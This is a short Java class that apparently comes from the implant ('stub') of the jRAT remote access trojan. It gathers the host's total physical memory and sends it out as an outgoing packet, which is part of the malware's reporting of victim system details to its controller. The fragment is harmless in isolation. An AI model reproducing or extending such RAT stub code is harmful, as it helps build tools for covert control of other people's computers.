package io.jrat.stub.packets.outgoing;

import com.sun.management.OperatingSystemMXBean;
import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;
import java.lang.management.ManagementFactory;


public class Packet13InitTotalMemory extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		long total = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
				
		dos.writeLong(total);
	}

	@Override
	public short getPacketId() {
		return (byte) 13;
	}
}
